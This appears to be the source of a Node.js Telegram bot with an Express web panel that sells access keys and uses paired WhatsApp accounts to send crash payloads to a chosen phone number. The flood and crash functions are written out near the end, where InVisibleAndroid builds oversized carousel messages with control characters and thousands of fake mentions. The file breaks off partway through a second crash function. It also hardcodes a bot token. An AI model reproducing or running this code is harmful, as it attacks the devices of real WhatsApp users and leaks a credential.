// ==================== MODULE IMPORTS ==================== //
const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const AdmZip = require("adm-zip");
const tar = require("tar");
const os = require("os");
const fse = require("fs-extra");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  makeInMemoryStore
} = require('@whiskeysockets/baileys');

// ==================== CONFIGURATION ==================== //
const BOT_TOKEN = "8316634587:AAHPyMl-NW2LZSsmSUyH5b8NU7FvAOUb7mg";
const OWNER_ID = "6208011594";
const bot = new Telegraf(BOT_TOKEN);
const { domain, port } = require("./database/config");
const app = express();

// ==================== GLOBAL VARIABLES ==================== //
const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
const cooldowns = {};
let DEFAULT_COOLDOWN_MS = 5 * 60 * 1000;

// ==================== UTILITY FUNCTIONS ==================== //
function loadAkses() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id);
}

function isAuthorized(id) {
  const data = loadAkses();
  return isOwner(id) || data.akses.includes(id);
}

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  if (!str || typeof str !== "string") return null;
  
  const match = str.match(/^(\d+)(s|m|h|d)$/i);
  if (!match) return null;

  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();

  switch (unit) {
    case "s": return value * 1000;
    case "m": return value * 60 * 1000;
    case "h": return value * 60 * 60 * 1000;
    case "d": return value * 24 * 60 * 60 * 1000;
    default: return null;
  }
}

function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
    console.log("✅ Data user berhasil disimpan.");
  } catch (err) {
    console.error("❌ Gagal menyimpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
  } catch (err) {
    console.error("❌ Gagal membaca file user.json:", err);
    return [];
  }
}

// ==================== WHATSAPP CONNECTION UTILITIES ==================== //
// Store untuk menyimpan pesan (optional, bisa dihapus jika tidak perlu)
let store;
try {
  store = makeInMemoryStore({ 
    logger: pino().child({ level: 'silent', stream: 'store' }) 
  });
} catch (e) {
  console.log(chalk.yellow('⚠️  Store tidak tersedia, lanjut tanpa store'));
  store = null;
}

const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    fs.writeFileSync(file_session, JSON.stringify([...list, BotNumber]));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const makeStatus = (number, status) => `\`\`\`
┌───────────────────────────
│ STATUS │ ${status.toUpperCase()}
├───────────────────────────┤
│ Nomor : ${number}
└───────────────────────────\`\`\``;

const makeCode = (number, code) => ({
  text: `\`\`\`
┌───────────────────────────
│ STATUS │ SEDANG PAIR
├───────────────────────────┤
│ Nomor : ${number}
│ Kode  : ${code}
└───────────────────────────
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "!! 𝐒𝐚𝐥𝐢𝐧 𝐂𝐨𝐝𝐞 !!", callback_data: `salin|${code}` }]
    ]
  }
});

// ==================== WHATSAPP CONNECTION HANDLERS ==================== //

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  
  console.log(chalk.blue(`
┌──────────────────────────────
│ Ditemukan sesi WhatsApp aktif
├──────────────────────────────┤
│ Jumlah : ${activeNumbers.length}
└──────────────────────────────┘ `));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    await connectWhatsAppSession(BotNumber);
  }
};

const connectWhatsAppSession = async (BotNumber) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    version,
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    browser: ['Mac OS', 'Safari', '10.15.7'],
    keepAliveIntervalMs: 30000,
    getMessage: async (key) => ({ conversation: 'P' }),
  });

  if (store) store.bind(sock.ev);
  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "open") {
      console.log(chalk.green(`✅ Bot ${BotNumber} terhubung!`));
      sessions.set(BotNumber, sock);
    }
    
    if (connection === "close") {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(chalk.red(`❌ Bot ${BotNumber} terputus`));
      
      if (shouldReconnect) {
        console.log(chalk.yellow(`🔄 Menghubungkan ulang ${BotNumber}...`));
        setTimeout(() => connectWhatsAppSession(BotNumber), 3000);
      } else {
        sessions.delete(BotNumber);
        const list = JSON.parse(fs.readFileSync(file_session));
        fs.writeFileSync(file_session, JSON.stringify(list.filter(n => n !== BotNumber)));
      }
    }
  });

  return sock;
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${BotNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text, markup) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { 
        parse_mode: "Markdown",
        reply_markup: markup 
      });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  const sock = makeWASocket({
    version,
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    browser: ['Mac OS', 'Safari', '10.15.7'],
    keepAliveIntervalMs: 30000,
    getMessage: async (key) => ({ conversation: 'P' }),
  });

  if (store) store.bind(sock.ev);
  let isConnected = false;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menghubungkan ulang..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "❌ Gagal terhubung."));
        return fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, sock);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✅ Berhasil terhubung."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(BotNumber);
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;
          await editStatus(makeCode(BotNumber, formatted).text, makeCode(BotNumber, formatted).reply_markup);
        }
      } catch (err) {
        console.error("Error requesting code:", err);
        await editStatus(makeStatus(BotNumber, `⚠ ${err.message}`));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};
// ==================== BOT COMMANDS ==================== //

// Start command
bot.command("start", (ctx) => {
  const teks = `\`\`\`
( 🕊️ ) ─ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍𝐒 ─
𝐅𝐚𝐬𝐭, 𝐟𝐥𝐞𝐱𝐢𝐛𝐥𝐞, 𝐚𝐧𝐝 𝐚𝐛𝐬𝐨𝐥𝐮𝐭𝐞𝐥𝐲 𝐬𝐚𝐟𝐞,
𝐭𝐡𝐞 𝐧𝐞𝐱𝐭-𝐠𝐞𝐧𝐞𝐫𝐚𝐭𝐢𝐨𝐧 𝐛𝐨𝐭 𝐧𝐨𝐰 𝐚𝐰𝐚𝐤𝐞𝐧𝐬.

〢「 𝑺𝒚𝒏𝒕𝒉𝒊𝒙 𝑻𝒓𝒂𝒔𝒉𝒆𝒅 」
│「々」ᴀᴜᴛʜᴏʀ : @nazarickspy
│「々」ᴛʏᴘᴇ  : Case ✗ Plugins
│「々」ʟᴇᴀɢᴜᴇ  : Asia/Indonesia

╭─⦏ 𝑺𝒆𝒏𝒅𝒆𝒓 𝑴𝒆𝒏𝒖 ⦐
│「々」/connect
│「々」/listsender
│「々」/delsender
╰────────────

╭─⦏ 𝑲𝒆𝒚 𝑴𝒂𝒏𝒂𝒈𝒆𝒓 ⦐
│「々」/ckey
│「々」/listkey
│「々」/delkey
╰───────────

╭─⦏ 𝑨𝒄𝒄𝒆𝒔𝒔 𝑴𝒆𝒏𝒖 ⦐
│「々」/addacces
│「々」/delacces
│「々」/addowner
│「々」/delowner
│「々」/setjeda
╰────────────\`\`\``;
  ctx.replyWithPhoto(
    { url: "https://files.catbox.moe/ydj2rk.jpg" },
    {
      caption: teks,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "👤「所有者」", url: "https://t.me/nazarickspy" },
          { text: "🕊「チャネル」", url: "t.me/nazarickspy" }
          ]
        ]
      }
    }
  );
});

bot.command("connect", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }

  if (args.length < 2) {
    return ctx.reply("❌ *Syntax Error!*\n\n_Use : /connect Number_\n_Example : /connect 628xxxx_", { parse_mode: "Markdown" });
  }

  const BotNumber = args[1].replace(/[^0-9]/g, '');
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("listsender", (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
  ctx.reply(`*Daftar Sender Aktif:*\n${[...sessions.keys()].map(n => `• ${n}`).join("\n")}`, 
    { parse_mode: "Markdown" });
});

bot.command("delbot", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }
  
  if (args.length < 2) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delbot Number_\n_Example : /delbot 628xxxx_", { parse_mode: "Markdown" });

  const number = args[1].replace(/[^0-9]/g, '');
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    const sock = sessions.get(number);
    if (sock && sock.end) sock.end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    fs.writeFileSync(file_session, JSON.stringify(data.filter(n => n !== number)));
    ctx.reply(`✅ Session untuk bot ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Terjadi error saat menghapus sender.");
  }
});

async function findCredsFile(dir) {
  const files = fs.readdirSync(dir, { withFileTypes: true });
  for (const file of files) {
    const fullPath = path.join(dir, file.name);
    if (file.isDirectory()) {
      const result = await findCredsFile(fullPath);
      if (result) return result;
    } else if (file.name === "creds.json") {
      return fullPath;
    }
  }
  return null;
}

bot.command("add", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) {
    return ctx.reply("❌ Hanya owner yang bisa menggunakan perintah ini.");
  }

  const reply = ctx.message.reply_to_message;
  if (!reply || !reply.document) {
    return ctx.reply("❌ Balas file session dengan `/add`", { parse_mode: "Markdown" });
  }

  const doc = reply.document;
  const name = doc.file_name.toLowerCase();
  if (![".json", ".zip", ".tar", ".tar.gz", ".tgz"].some(ext => name.endsWith(ext))) {
    return ctx.reply("❌ File bukan session yang valid (.json/.zip/.tar/.tgz)");
  }

  await ctx.reply("📄 Memproses session…");

  try {
    const link = await ctx.telegram.getFileLink(doc.file_id);
    const { data } = await axios.get(link.href, { responseType: "arraybuffer" });
    const buf = Buffer.from(data);
    const tmp = await fse.mkdtemp(path.join(os.tmpdir(), "sess-"));

    if (name.endsWith(".json")) {
      await fse.writeFile(path.join(tmp, "creds.json"), buf);
    } else if (name.endsWith(".zip")) {
      new AdmZip(buf).extractAllTo(tmp, true);
    } else {
      const tmpTar = path.join(tmp, name);
      await fse.writeFile(tmpTar, buf);
      await tar.x({ file: tmpTar, cwd: tmp });
    }

    const credsPath = await findCredsFile(tmp);
    if (!credsPath) {
      return ctx.reply("❌ creds.json tidak ditemukan di dalam file.");
    }

    const creds = await fse.readJson(credsPath);
    const botNumber = creds.me.id.split(":")[0];
    const destDir = sessionPath(botNumber);

    await fse.remove(destDir);
    await fse.copy(tmp, destDir);
    saveActive(botNumber);

    await connectWhatsAppSession(botNumber);

    return ctx.reply(`✅ Session *${botNumber}* berhasil ditambahkan & online.`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("❌ Error add session:", err);
    return ctx.reply(`❌ Gagal memproses session.\nError: ${err.message}`);
  }
});

bot.command("ckey", (ctx) => {
  const userId = ctx.from.id.toString();
  const input = ctx.message.text.split(" ")[1];

  // Cek akses
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.telegram.sendMessage(
      userId,
      "[ ! ] - ONLY ACCES USER\n—Please register first to access this feature."
    );
  }

  // Cek input kosong / format salah
  if (!input || !input.includes(",")) {
    return ctx.telegram.sendMessage(
      userId,
      "❌ *Syntax Error!*\n\n_Use :_ `/ckey User,Day,CustomKey(optional)`\n_Example :_\n• `/ckey wan,1d`\n• `/ckey wan,1d,wan123`",
      { parse_mode: "Markdown" }
    );
  }

  const parts = input.split(",");
  const username = parts[0].trim();
  const durationStr = parts[1].trim();
  const customKey = parts[2] ? parts[2].trim() : null;

  // Cek format durasi
  const durationMs = parseDuration(durationStr);
  if (!durationMs) {
    return ctx.telegram.sendMessage(
      userId,
      "❌ Format durasi salah!\nContoh: 7d / 1d / 12h / 30m",
      { parse_mode: "Markdown" }
    );
  }

  // Jika user kasih key custom → pakai itu, kalau tidak → generate random
  const key = customKey || generateKey(8);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired };
  } else {
    users.push({ username, key, expired });
  }
  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  // Kirim hasil
  ctx.telegram.sendMessage(
    userId,
    `✅ *Key berhasil dibuat:*\n\n` +
    `🆔 *Username:* \`${username}\`\n` +
    `🔑 *Key:* \`${key}\`\n` +
    `⏳ *Expired:* _${expiredStr}_ WIB\n\n` +
    `*Note:*\n- Jangan disebar\n- Jangan difree-kan\n- Jangan dijual lagi`,
    { parse_mode: "Markdown" }
  ).then(() => {
    ctx.reply("");
  }).catch(err => {
    ctx.reply("❌ Gagal mengirim key ke user.");
    console.error("Error kirim key:", err);
  });
});

bot.command("listkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `🕸️ *Active Key List:*\n\n`;
  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `*${i + 1}. ${u.username}*\nKey: \`${u.key}\`\nExpired: _${exp}_ WIB\n\n`;
  });

  ctx.replyWithMarkdown(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }
  
  if (!username) return ctx.reply("◎Enter username!\nExample: /delkey rann");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`❌ Username \`${username}\` not found.`, { parse_mode: "Markdown" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✅ Key belonging to *${username}* was successfully deleted.`, { parse_mode: "Markdown" });
});

bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addacces Id_\n_Example : /addacces 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✅ User already has access.");

  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✅ Access granted to ID: ${id}`);
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delacces Id_\n_Example : /delacces 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("❌ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✅ Access to user ID ${id} removed.`);
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addowner Id_\n_Example : /addowner 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("❌ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✅ New owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delowner Id_\n_Example : /delowner 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (!data.owners.includes(id)) return ctx.reply("❌ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✅ Owner ID ${id} was successfully deleted.`);
});

bot.command("setjeda", async (ctx) => {
  const input = ctx.message.text.split(" ")[1]; 
  const ms = parseDuration(input);

  if (!ms) {
    return ctx.reply("❌ Format salah!\nContoh yang benar:\n- 30s (30 detik)\n- 5m (5 menit)\n- 1h (1 jam)\n- 1d (1 hari)");
  }

  globalThis.DEFAULT_COOLDOWN_MS = ms;
  DEFAULT_COOLDOWN_MS = ms;
  ctx.reply(`✅ Jeda berhasil diubah jadi *${input}* (${ms / 1000} detik)`, { parse_mode: "Markdown" });
});

bot.on('callback_query', async (ctx) => {
  const data = ctx.callbackQuery.data;
  if (data.startsWith('salin|')) {
    const code = data.split('|')[1];
    await ctx.answerCbQuery(`Kode ${code} berhasil disalin!`, { show_alert: true });
  }
});

// ==================== BOT INITIALIZATION ==================== //
console.clear();
console.log(chalk.blue(`
╔═══════════════════════════╗
║   SHADOW TRASHED BOT      ║
╠═══════════════════════════╣
║ ID OWN : ${OWNER_ID}      ║
║ DEVELOPER : VINZXESXC1ST  ║
║ MY SUPPORT : ALLAH        ║
╚═══════════════════════════╝
`));

bot.launch().then(() => {
  console.log(chalk.green('✅ BOT CONNECTED\n'));
  initializeWhatsAppConnections();
});

// ==================== WEB SERVER ==================== //
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "HCS-View", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "HCS-View", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });
  res.redirect("/execution");
});

app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  const msg = req.query.msg || "";
  const filePath = "./HCS-View/Login.html";

  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");

    if (!username) return res.send(html);

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.send(html);
    }

    const targetNumber = req.query.target;
    const mode = req.query.mode;
    const target = `${targetNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
        message: "Tunggu sampai maintenance selesai..."
      }, false, currentUser, "", mode));
    }

    if (!targetNumber) {
      if (!mode) {
        return res.send(executionPage("✅ Server ON", {
          message: "Pilih mode yang ingin digunakan."
        }, true, currentUser, "", ""));
      }

      if (["andros", "ios", "andros-delay", "invis-iphone"].includes(mode)) {
        return res.send(executionPage("✅ Server ON", {
          message: "Masukkan nomor target (62xxxxxxxxxx)."
        }, true, currentUser, "", mode));
      }

      return res.send(executionPage("❌ Mode salah", {
        message: "Mode tidak dikenali. Gunakan ?mode=andros atau ?mode=ios."
      }, false, currentUser, "", ""));
    }

    if (!/^\d+$/.test(targetNumber)) {
      return res.send(executionPage("❌ Format salah", {
        target: targetNumber,
        message: "Nomor harus hanya angka dan diawali dengan nomor negara"
      }, true, currentUser, "", mode));
    }

    try {
      // Ambil socket pertama yang tersedia
      const sock = [...sessions.values()][0];
      
      if (mode === "andros") {
        androcrash(24, target, sock);
      } else if (mode === "ios") {
        Ipongcrash(24, target, sock);
      } else if (mode === "andros-delay") {
        androinvis(24, sock, target);
      } else if (mode === "invis-iphone") {
        Iponginvis(24, sock, target);
      } else {
        throw new Error("Mode tidak dikenal.");
      }

      return res.send(executionPage("✅ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
      }, false, currentUser, "", mode));
    } catch (err) {
      return res.send(executionPage("❌ Gagal kirim", {
        target: targetNumber,
        message: err.message || "Terjadi kesalahan saat pengiriman."
      }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
    }
  });
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(port, () => {
  console.log(chalk.cyan(`🚀 Server aktif di ${domain}:${port}`));
});

// ==================== EXPORTS ==================== //
module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};

// ==================== FLOOD FUNCTIONS ==================== //
// Invisible
async function InVisibleAndroid(sock, target, show = true) {
         const mentionedList = [
                  "13135550002@s.whatsapp.net",
                  ...Array.from(
                           { length: 1950 },
                           () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                  )
         ];

         let push = [];

         for (let r = 0; r < 1055; r++) {
                  push.push({
                           body: proto.Message.InteractiveMessage.Body.fromObject({ text: " \u0000 " }),
                           footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: " \u0003 " }),
                           header: proto.Message.InteractiveMessage.Header.fromObject({
                                    title: " ",
                                    hasMediaAttachment: true,
                                    imageMessage: {
                                             url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
                                             mimetype: "image/jpeg",
                                             fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
                                             fileLength: "18352",
                                             height: 720,
                                             width: 1280,
                                             mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
                                             fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
                                             directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
                                             mediaKeyTimestamp: "1737281900",
                                             jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIiQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
                                             scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
                                             scanLengths: [3537, 10557, 1905, 2353],
                                             midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo="
                                    }
                           }),
                           nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                    buttons: []
                           })
                  });
         }

         const msg = await generateWAMessageFromContent(
                  target,
                  {
                           viewOnceMessage: {
                                    message: {
                                             messageContextInfo: {
                                                      deviceListMetadata: {},
                                                      deviceListMetadataVersion: 2
                                             },
                                             interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                                                      body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
                                                      footer: proto.Message.InteractiveMessage.Footer.create({
                                                               text: "ðŸ©¸âƒŸà¼‘âŒâƒ°ð‘ð¢ð³ð±ð•ðžð¥ð³â€Œð„ð±â€Œâ€Œðžðœð®â€Œð­ð¢ð¨ð§à½€â€Œâ€ŒðŸ¦ "
                                                      }),
                                                      header: proto.Message.InteractiveMessage.Header.create({
                                                               hasMediaAttachment: false
                                                      }),
                                                      carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                                               cards: [...push]
                                                      }),
                                                      contextInfo: {
                                                               mentionedJid: mentionedList,
                                                               isSampled: true,
                                                               forwardingScore: 9741,
                                                               isForwarded: true
                                                      }
                                             })
                                    }
                           }
                  },
                  {}
         );

         await sock.relayMessage("status@broadcast", msg.message, {
                  messageId: msg.key.id,
                  statusJidList: [target],
                  additionalNodes: [
                           {
                                    tag: "meta",
                                    attrs: {},
                                    content: [
                                             {
                                                      tag: "mentioned_users",
                                                      attrs: {},
                                                      content: [
                                                               { tag: "to", attrs: { jid: target }, content: undefined }
                                                      ]
                                             }
                                    ]
                           }
                  ]
         });

         if (show) {
                  await sock.relayMessage(
                           target,
                           {
                                    groupStatusMentionMessage: {
                                             message: { protocolMessage: { key: msg.key, type: 25 } }
                                    }
                           },
                           {
                                    additionalNodes: [
                                             {
                                                      tag: "meta",
                                                      attrs: { is_status_mention: "4izxvelzExerct1st.ðŸ•¸ï¸" }
                                             }
                                    ]
                           }
                  );
         }

         console.log(
                  chalk.green(
                           `Succes Send Bug By RizxvelzExec1St.ðŸ‰\nNumber: ${target}`
                  )
         );
         await new Promise(resolve => setTimeout(resolve, 9000));
}

// Crash
async function crashinvis(target, sock) {
  try {
    const mentionedMetaAi = [
      "13135550001@s.whatsapp.net", "13135550002@s.whatsapp.net",
      "13135550003@s.whatsapp.net", "13135550004@s.whatsapp.net",
      "13135550005@s.whatsapp.net", "13135550006@s.whatsapp.net",
      "13135550007@s.whatsapp.net", "13135550008@s.whatsapp.net",
      "13135550009@s.whatsapp.net", "13135550010@s.whatsapp.net"
    ];
